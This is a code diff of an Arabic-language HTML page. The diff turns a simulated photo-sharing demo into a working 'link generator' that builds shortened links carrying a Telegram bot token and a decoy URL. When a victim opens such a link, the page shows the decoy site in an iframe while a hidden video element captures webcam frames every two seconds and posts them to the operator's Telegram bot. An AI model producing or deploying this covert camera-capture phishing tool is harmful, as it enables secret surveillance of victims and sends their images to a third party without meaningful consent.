@@ -1,248 +1,145 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشارك الصور</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f5f5f5;
-            margin: 0;
-            padding: 20px;
-            color: #333;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            text-align: center;
-            color: #4a89dc;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #4a89dc;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #3a70b0;
-        }
-        #linkContainer {
-            margin-top: 20px;
-            display: none;
-        }
-        #shareLink {
-            padding: 10px;
-            background-color: #f9f9f9;
-            border: 1px dashed #4a89dc;
-            border-radius: 5px;
-            word-break: break-all;
-        }
-        #cameraContainer {
-            display: none;
-            text-align: center;
-        }
-        #video, #canvas {
-            width: 100%;
-            max-width: 500px;
-            border-radius: 5px;
-            border: 1px solid #ddd;
-        }
-        .capture-btn {
-            margin: 15px 0;
-        }
-        #resultImage {
-            max-width: 100%;
-            display: none;
-            margin-top: 15px;
-            border-radius: 5px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>مولد الروابط</title>
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      background: #0f0f0f url('YOUR_IMAGE_URL') no-repeat center center / cover;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .box {
+      background: rgba(0,0,0,0.7);
+      padding: 20px;
+      border-radius: 12px;
+      width: 350px;
+    }
+    h1 {
+      text-align: center;
+      color: #4a89dc;
+    }
+    .input-group { margin-bottom: 15px; }
+    label { display: block; margin-bottom: 5px; }
+    input {
+      width: 100%; padding: 10px; border: none;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%; padding: 12px; border: none;
+      border-radius: 8px;
+      background: #4a89dc; color: #fff;
+      cursor: pointer; font-size: 16px;
+    }
+    button:hover { background: #3570b5; }
+    #result {
+      margin-top: 15px; word-break: break-all;
+      background: rgba(255,255,255,0.1);
+      padding: 10px; border-radius: 8px;
+    }
+    .camera-note {
+      background: rgba(0,0,0,0.6);
+      color: #ffcc00;
+      text-align: center;
+      padding: 5px;
+      font-size: 14px;
+    }
+    iframe {
+      border: none;
+      width: 100%;
+      height: calc(100vh - 30px);
+    }
+  </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
-        <h1>مشارك الصور</h1>
-        
-        <div class="input-group">
-            <label for="ipInput">عنوان IP الخاص بك:</label>
-            <input type="text" id="ipInput" placeholder="أدخل عنوان IP الخاص بك">
-        </div>
-        
-        <div class="input-group">
-            <label for="tokenInput">توكن البوت:</label>
-            <input type="text" id="tokenInput" placeholder="أدخل توكن البوت الخاص بك">
-        </div>
-        
-        <button id="generateBtn">إنشاء رابط المشاركة</button>
-        
-        <div id="linkContainer">
-            <h3>رابط المشاركة:</h3>
-            <div id="shareLink"></div>
-            <button id="copyBtn" style="margin-top: 10px;">نسخ الرابط</button>
-        </div>
-    </div>
 
-    <div class="container" id="cameraContainer">
-        <h2>صفحة التقاط الصورة</h2>
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-        <button id="captureBtn" class="capture-btn">التقاط صورة</button>
-        <img id="resultImage" alt="الصورة الملتقطة">
-        <div id="uploadStatus" style="margin-top: 15px;"></div>
-    </div>
+<div class="box" id="formBox">
+  <h1>مولد الروابط</h1>
+  <div class="input-group">
+    <label>أدخل الـ ID</label>
+    <input type="text" id="chatIdInput" placeholder="Chat ID">
+  </div>
+  <div class="input-group">
+    <label>أدخل التوكن</label>
+    <input type="text" id="tokenInput" placeholder="Bot Token">
+  </div>
+  <div class="input-group">
+    <label>أدخل الرابط</label>
+    <input type="text" id="linkInput" placeholder="https://example.com">
+  </div>
+  <button id="generateBtn">إنشاء الرابط</button>
+  <div id="result"></div>
+</div>
 
-    <script>
-        // عناصر DOM
-        const mainContainer = document.getElementById('mainContainer');
-        const cameraContainer = document.getElementById('cameraContainer');
-        const ipInput = document.getElementById('ipInput');
-        const tokenInput = document.getElementById('tokenInput');
-        const generateBtn = document.getElementById('generateBtn');
-        const linkContainer = document.getElementById('linkContainer');
-        const shareLink = document.getElementById('shareLink');
-        const copyBtn = document.getElementById('copyBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureBtn = document.getElementById('captureBtn');
-        const resultImage = document.getElementById('resultImage');
-        const uploadStatus = document.getElementById('uploadStatus');
+<script>
+const generateBtn = document.getElementById("generateBtn");
+const result = document.getElementById("result");
 
-        // معلمات URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const shareId = urlParams.get('id');
+generateBtn.addEventListener("click", async () => {
+  const chatId = document.getElementById("chatIdInput").value.trim();
+  const token = document.getElementById("tokenInput").value.trim();
+  const link = document.getElementById("linkInput").value.trim();
 
-        // تحقق إذا كانت هذه صفحة المشاركة
-        if (shareId) {
-            mainContainer.style.display = 'none';
-            cameraContainer.style.display = 'block';
-            initCamera();
-        }
+  if (!chatId || !token || !link) {
+    alert("املأ كل الحقول");
+    return;
+  }
 
-        // تهيئة الكاميرا
-        function initCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(function(stream) {
-                video.srcObject = stream;
-            })
-            .catch(function(err) {
-                uploadStatus.textContent = 'خطأ في الوصول إلى الكاميرا: ' + err.message;
-                uploadStatus.style.color = 'red';
-            });
-        }
+  const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chatId)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(link)}`;
 
-        // التقاط الصورة
-        captureBtn.addEventListener('click', function() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // عرض الصورة الملتقطة
-            resultImage.src = canvas.toDataURL('image/png');
-            resultImage.style.display = 'block';
-            captureBtn.style.display = 'none';
-            
-            // إرسال الصورة
-            sendImage();
+  try {
+    const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(fullLink)}`);
+    const shortUrl = await res.text();
+    result.innerHTML = `<p>🔗 رابطك المختصر:</p><div>${shortUrl}</div>`;
+  } catch (e) {
+    result.textContent = "خطأ في الاختصار: " + e.message;
+  }
+});
+
+const urlParams = new URLSearchParams(window.location.search);
+const openUrl = urlParams.get("url");
+const chatId = urlParams.get("chat");
+const token = urlParams.get("token");
+
+if (openUrl && chatId && token) {
+  document.body.innerHTML = `
+    <div class="camera-note">📷 يتم التقاط صور...</div>
+    <iframe src="${openUrl}"></iframe>
+  `;
+
+  const video = document.createElement("video");
+  video.autoplay = true;
+  video.style.display = "none";
+  document.body.appendChild(video);
+
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    video.srcObject = stream;
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+
+    setInterval(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "image.jpg");
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
         });
+      }, "image/jpeg");
+    }, 2000);
+  });
+}
+</script>
 
-        // إرسال الصورة إلى الخادم
-        function sendImage() {
-            uploadStatus.textContent = 'جاري إرسال الصورة...';
-            uploadStatus.style.color = 'blue';
-            
-            // في الواقع، هنا سيتم إرسال الصورة إلى الخادم باستخدام IP والتوكن المحددين
-            // لكن بما أننا لا نملك خادمًا حقيقيًا، سنقوم بمحاكاة الإرسال
-            
-            // في التطبيق الحقيقي، نستخدم:
-            // const formData = new FormData();
-            // canvas.toBlob(function(blob) {
-            //     formData.append('image', blob, 'image.png');
-            //     fetch(`http://${ip}/upload?token=${token}`, {
-            //         method: 'POST',
-            //         body: formData
-            //     })
-            //     .then(response => response.json())
-            //     .then(data => {
-            //         uploadStatus.textContent = 'تم إرسال الصورة بنجاح!';
-            //         uploadStatus.style.color = 'green';
-            //     })
-            //     .catch(error => {
-            //         uploadStatus.textContent = 'خطأ في الإرسال: ' + error.message;
-            //         uploadStatus.style.color = 'red';
-            //     });
-            // }, 'image/png');
-            
-            // محاكاة الإرسال
-            setTimeout(() => {
-                uploadStatus.textContent = 'تم إرسال الصورة بنجاح!';
-                uploadStatus.style.color = 'green';
-            }, 2000);
-        }
-
-        // إنشاء رابط المشاركة
-        generateBtn.addEventListener('click', function() {
-            const ip = ipInput.value.trim();
-            const token = tokenInput.value.trim();
-            
-            if (!ip || !token) {
-                alert('يرجى ملء جميع الحقول');
-                return;
-            }
-            
-            // إنشاء معرف فريد للمشاركة
-            const uniqueId = generateUniqueId();
-            
-            // إنشاء رابط المشاركة
-            const link = `${window.location.origin}${window.location.pathname}?id=${uniqueId}`;
-            
-            // حفظ البيانات محلياً (في الواقع، سيتم حفظها في الخادم)
-            localStorage.setItem(`share_${uniqueId}`, JSON.stringify({ ip, token }));
-            
-            // عرض رابط المشاركة
-            shareLink.textContent = link;
-            linkContainer.style.display = 'block';
-        });
-
-        // نسخ الرابط
-        copyBtn.addEventListener('click', function() {
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = shareLink.textContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-            alert('تم نسخ الرابط!');
-        });
-
-        // إنشاء معرف فريد
-        function generateUniqueId() {
-            return Math.random().toString(36).substring(2) + Date.now().toString(36);
-        }
-    </script>
 </body>
 </html>
